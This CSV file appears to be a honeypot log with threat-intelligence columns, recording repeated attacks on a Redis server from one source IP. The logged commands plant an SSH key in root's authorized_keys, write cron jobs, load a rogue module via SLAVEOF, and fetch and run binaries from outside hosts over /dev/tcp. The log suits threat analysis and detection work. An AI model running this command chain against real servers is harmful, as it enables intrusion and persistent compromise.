time,action,Anon Src IP,src_port,level,VT Malicious,VT Engines,VT Labels,VT Reputation,Geo Location,ISP,Unnamed: 11,VT Tags,Malicious_Flag
4/1/2025 14:05,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,config set dir /root/.ssh/,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,config set dbfilename authorized_keys,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,SLAVEOF 168.119.173.48 60142,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,CONFIG SET dir /tmp/,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,CONFIG SET dbfilename exp.so,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,MODULE LOAD /tmp/exp.so,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,SLAVEOF NO ONE,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,"system.exec ""bash -c \""exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/RFfWOLUok2 && chmod +x /tmp/RFfWOLUok2 && /tmp/RFfWOLUok2 6774mccuzp7wsJudreebxzrJn/iqmIqv+5bRMcub56+SmrD7mcU2z575qYqSsPueyC7Nmvmwkpik/5/ONMeP+K+dhKv5gc0wyoH7rJiQqPmezjRQrsEp+RwGhggw+szH\""""",171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,"system.exec ""rm -rf /tmp/exp.so""",171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,MODULE UNLOAD system,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:05,Closed,171.40.179.254,33686,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,FLUSHDB,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,NewConnect,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,info server,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q vtfVKfFtGd;then exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/vtfVKfFtGd ;fi && chmod +x /tmp/vtfVKfFtGd && /tmp/vtfVKfFtGd vwoZUyKf1NjE1p4+RRMQyM4bFUUwn9HP2NKaJFMQEs7QGBdHJp7SxsHDnyZFDxvPxwQQSiOA187M1Z4hSRMKz88dD0gggNHGw82cIk8bHM7PGxWHjyw0Un89vkje0UJJDaV5sKA=\n""",171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,config set rdbcompression no,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,save,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,config set dir .,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,config set dir /root/.ssh/,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,config set dbfilename dump.rdb,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,config set rdbcompression yes,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,config set dbfilename authorized_keys,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,CONFIG SET dir /tmp/,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,CONFIG SET dbfilename exp.so,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,SLAVEOF 168.119.173.48 60142,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,MODULE LOAD /tmp/exp.so,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,"system.exec ""bash -c \""exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/vtfVKfFtGd && chmod +x /tmp/vtfVKfFtGd && /tmp/vtfVKfFtGd vwoZUyKf1NjE1p4+RRMQyM4bFUUwn9HP2NKaJFMQEs7QGBdHJp7SxsHDnyZFDxvPxwQQSiOA187M1Z4hSRMKz88dD0gggNHGw82cIk8bHM7PGxWHjyw0Un89vkje0UJJDaV5sKA=\""""",171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,SLAVEOF NO ONE,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,"system.exec ""rm -rf /tmp/exp.so""",171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,MODULE UNLOAD system,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:06,Closed,171.40.179.254,34142,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,NewConnect,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,info server,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,FLUSHDB,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q eloyKiVLsh;then exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/eloyKiVLsh ;fi && chmod +x /tmp/eloyKiVLsh && /tmp/eloyKiVLsh VO9qddEu2XNv4SQt/3V13jred2r/IjX+bX/GMdl+df4iJuFvf9I22HZv/TUt4Wl23y7acmvhLSf1bXfZNNBnav4iO/pradow3Wlp/Scv+Wt22TQ3c3Eu5XoNaSq8IgsA\n""",171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,config set rdbcompression no,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,save,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,config set dir .,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,config set dbfilename dump.rdb,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,config set dbfilename authorized_keys,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,config set dir /root/.ssh/,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,config set rdbcompression yes,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,CONFIG SET dir /tmp/,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,CONFIG SET dbfilename exp.so,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,SLAVEOF 129.144.180.26 60107,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,MODULE LOAD /tmp/exp.so,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,SLAVEOF NO ONE,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,"system.exec ""bash -c \""exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/eloyKiVLsh && chmod +x /tmp/eloyKiVLsh && /tmp/eloyKiVLsh VO9qddEu2XNv4SQt/3V13jred2r/IjX+bX/GMdl+df4iJuFvf9I22HZv/TUt4Wl23y7acmvhLSf1bXfZNNBnav4iO/pradow3Wlp/Scv+Wt22TQ3c3Eu5XoNaSq8IgsA\""""",171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,MODULE UNLOAD system,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,Closed,171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:07,"system.exec ""rm -rf /tmp/exp.so""",171.40.179.254,34514,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,NewConnect,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,info server,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,FLUSHDB,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q pfv4kv7uy6;then exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/pfv4kv7uy6 ;fi && chmod +x /tmp/pfv4kv7uy6 && /tmp/pfv4kv7uy6 Ij2dCH84Dn52ESdwDYIpW1krnA9zJB9+fQY4dgqYM1JbLYIMcSwJf34PIWcGgi9SVDOeC3c4B311CSZ2CpQ9UlIqggt3OA1/ehEkdQyWK1NSLJjNpsFsllrhqOfeTNFSbbuu4/M=\n""",171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,config set rdbcompression no,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,save,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,config set dir .,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,config set dbfilename dump.rdb,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,config set rdbcompression yes,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,config set dbfilename authorized_keys,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,config set dir /root/.ssh/,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,CONFIG SET dir /tmp/,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,CONFIG SET dbfilename exp.so,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,SLAVEOF 129.144.180.26 60107,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,MODULE LOAD /tmp/exp.so,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,SLAVEOF NO ONE,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,"system.exec ""rm -rf /tmp/exp.so""",171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,"system.exec ""bash -c \""exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/pfv4kv7uy6 && chmod +x /tmp/pfv4kv7uy6 && /tmp/pfv4kv7uy6 Ij2dCH84Dn52ESdwDYIpW1krnA9zJB9+fQY4dgqYM1JbLYIMcSwJf34PIWcGgi9SVDOeC3c4B311CSZ2CpQ9UlIqggt3OA1/ehEkdQyWK1NSLJjNpsFsllrhqOfeTNFSbbuu4/M=\""""",171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,MODULE UNLOAD system,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:08,Closed,171.40.179.254,34642,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,NewConnect,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,info server,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,FLUSHDB,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q IOU4x4gD7n;then exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/IOU4x4gD7n ;fi && chmod +x /tmp/IOU4x4gD7n && /tmp/IOU4x4gD7n 1I10xx0NgmILT7l9mK/X07uedblRCHaCFRzbdJysu5xyxgoXi2wJUblxmqHdy7OZcqZTCmadGxbPc52koZVlxBUUnWMPT7p1na/X17OSc7hQDmKIK15Qrp1l6+Osw2Nd9lWwd/UmS83cvda+iqUbhh3H2Q==\n""",171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,config set rdbcompression no,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,save,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,config set dir .,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,config set dbfilename dump.rdb,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,config set rdbcompression yes,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,config set dir /root/.ssh/,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,config set dbfilename authorized_keys,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,CONFIG SET dir /tmp/,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,CONFIG SET dbfilename exp.so,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,SLAVEOF 129.144.180.26 60107,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,MODULE LOAD /tmp/exp.so,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,SLAVEOF NO ONE,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,MODULE UNLOAD system,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,"system.exec ""rm -rf /tmp/exp.so""",171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,Closed,171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:09,"system.exec ""bash -c \""exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/IOU4x4gD7n && chmod +x /tmp/IOU4x4gD7n && /tmp/IOU4x4gD7n 1I10xx0NgmILT7l9mK/X07uedblRCHaCFRzbdJysu5xyxgoXi2wJUblxmqHdy7OZcqZTCmadGxbPc52koZVlxBUUnWMPT7p1na/X17OSc7hQDmKIK15Qrp1l6+Osw2Nd9lWwd/UmS83cvda+iqUbhh3H2Q==\""""",171.40.179.254,34762,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,NewConnect,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,info server,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,FLUSHDB,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,"set x ""\n* * * * * if ! ps | grep -v grep | grep -q V4PIMzOg8U;then exec 6<>/dev/tcp/168.119.173.48/60142 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/V4PIMzOg8U ;fi && chmod +x /tmp/V4PIMzOg8U && /tmp/V4PIMzOg8U wNZA3T/uopJtw+SbQFUyTUqV5dxpkbPxMNdfx7C42EDYNe6nnmPb5ZJESSBDXpHk2neUpvAo10PMt7HHRdcm8aKRd9jljUJLNVVCkefXb5ai8TL8PDGWi4q7s+4JCtCpROA/2XPf5LcVKEqNeUDKfbSp\n""",171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,config set rdbcompression no,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,save,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,config set dir .,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,config set dbfilename dump.rdb,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,config set rdbcompression yes,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,"set x ""\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZh7PuIw0sqnlzZcJAYWJ8/vx4q/yfW1T2JIOlA9vO5RsoqgzUFxZmu8Nx7hgzufSCQ3RcL3hovAhfTMsKGH77qTTyZRSkteM/pojQEl/33ock1QhuCjv0HrrkOFj55Ij9gjQv6JSZsXNY+34IS7xFs/2BdqjHzQmNTYubsZl81doL0nDbEr6UWoR8ASwIEUn57nciP0OivpVG07Z34uNbCvLZIm8bF1DYD1W/B18QrvKWsyATBkl8Wa/6zXurAMoJby3QH2OdttrLHban8xboh7WohEEn3+/jNuGGgKgpQbxCHUryZ5twTKYRwrTQkGqlWaZj8MugRq1L8md2akOb root@localhost.localdomain\n\n""",171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,config set dir /root/.ssh/,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,config set dbfilename authorized_keys,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,CONFIG SET dir /tmp/,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,CONFIG SET dbfilename exp.so,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:10,SLAVEOF 168.119.173.48 60142,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:11,MODULE LOAD /tmp/exp.so,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:11,SLAVEOF NO ONE,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:11,config set dir .,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:11,config set dbfilename dump.rdb,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
4/1/2025 14:11,MODULE UNLOAD system,171.40.179.254,34886,info,1,SOCRadar,malware,0,CN,"AS23724 IDC, China Telecommunications Corporation",,,0
